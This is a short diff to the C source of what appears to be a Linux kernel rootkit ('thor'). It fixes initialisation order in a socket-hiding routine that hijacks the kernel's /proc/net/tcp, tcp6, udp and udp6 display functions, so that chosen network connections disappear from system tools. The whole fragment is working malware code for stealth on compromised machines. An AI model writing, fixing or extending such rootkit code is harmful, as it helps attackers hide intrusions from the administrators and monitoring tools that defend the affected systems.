@@ -40,6 +40,8 @@ static int thor_udp6_seq_show(struct seq_file *seq, void *v);
 
 int sockethider_init(void)
 {
+    INIT_LIST_HEAD(&socket_list.list);
+
     tcp4_seq_show = get_tcp_seq_show("/proc/net/tcp");
     if (tcp4_seq_show == NULL)
         return -1;
@@ -55,8 +57,6 @@ int sockethider_init(void)
     udp6_seq_show = get_udp_seq_show("/proc/net/udp6");
     if (udp6_seq_show == NULL)
         return -1;
-
-    INIT_LIST_HEAD(&socket_list.list);
 
     hijack(tcp4_seq_show, thor_tcp4_seq_show);
     hijack(tcp6_seq_show, thor_tcp6_seq_show);
